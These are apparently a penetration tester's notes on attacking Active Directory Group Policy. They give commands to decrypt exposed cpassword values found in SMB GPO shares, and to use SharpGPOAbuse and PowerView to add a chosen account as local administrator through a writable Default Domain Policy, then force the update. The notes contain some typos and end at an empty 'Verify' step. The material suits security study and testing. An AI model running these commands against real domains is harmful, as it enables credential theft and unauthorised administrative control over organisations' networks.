Exposed cpassword
	cpassword is an AD component that allows admins to set passwords via group policy
	can possibly be found in SMB GPO shares
Decryption
```
gpp-decrypt <cpasswd>
```



Change Policy
```
# If you have GenericWrite over a policy, you can do this...

`./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount charlotte --GPOName "Default Domain Policy"

# then Force an GPO update

`gpupdate /force`

# then Reauthenticate
```

If you do not have GenericWrite but are able to get it (ie DACL abuse, etc)...
```
#Windows

1. Upload PowerView.ps1 and it

	Import-Module .\PowerView.ps1
	.\PowerView.ps1

2. Get the Default Domain Polify (or whatever you are able to control)

	Get-GPO -Name "Default Domain Policy"

3. View Perms (bloodhound might have already tipped you that you can control it)

	Get-GPPermission -Guid <ID> -TargetType User -TargetName <user>

4. SharoGPOAbuse.exe

	.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "Default Domain Policy"

5. Force update

	gpupdate /force

6. Verify

```